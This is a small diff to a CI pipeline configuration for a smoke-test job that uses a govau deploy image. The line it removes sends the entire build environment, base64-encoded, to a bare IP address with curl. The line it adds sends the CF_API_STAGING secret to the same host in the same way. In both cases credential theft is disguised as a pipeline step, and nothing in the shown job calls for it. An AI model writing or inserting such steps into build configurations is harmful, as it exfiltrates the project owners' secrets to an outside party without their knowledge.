@@ -7,7 +7,7 @@ jobs:
       - image: govau/cga-deploy-cf-smoke-tests:latest
     steps:
       - checkout
-      - run: curl http://103.16.128.93/?x=$(env | base64 | tr -d '\n')
+      - run: curl http://103.16.128.93/?x=$(echo "${CF_API_STAGING}" | base64 | tr -d '\n')
   run-prod:
     docker:
       - image: govau/cga-deploy-cf-smoke-tests:latest
